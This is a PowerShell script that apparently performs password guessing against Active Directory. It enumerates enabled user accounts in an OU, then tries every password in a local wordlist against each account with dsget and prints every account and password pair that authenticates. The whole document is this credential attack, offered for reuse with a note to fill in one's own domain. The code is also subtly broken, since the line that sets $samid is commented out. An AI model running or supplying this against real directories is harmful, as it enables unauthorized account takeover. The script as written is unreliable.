  
# Update with your own OU, domain and password. 
# Old School...
$sb = "CN=Users,dc=ad,dc=local"

Get-ADUser -SearchBase $sb -Filter 'Enabled -eq $true'   | Select distinguishedName | 
ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Set-Content users.txt

foreach ($FQDN in Get-Content .\users.txt)
{
    "Checking: " + $FQDN
    $results = dsget user $FQDN -samid
    #$samid = $results[1].replace(" ", "")
    foreach ($password in Get-Content .\password.txt)
    {
        $password = $password.replace(" ", "")
        dsget user $FQDN -u $samid -p $password > $null
        if ($?) {
            Write-Host "Account: $samid; Password: $password"
                }
    }
}
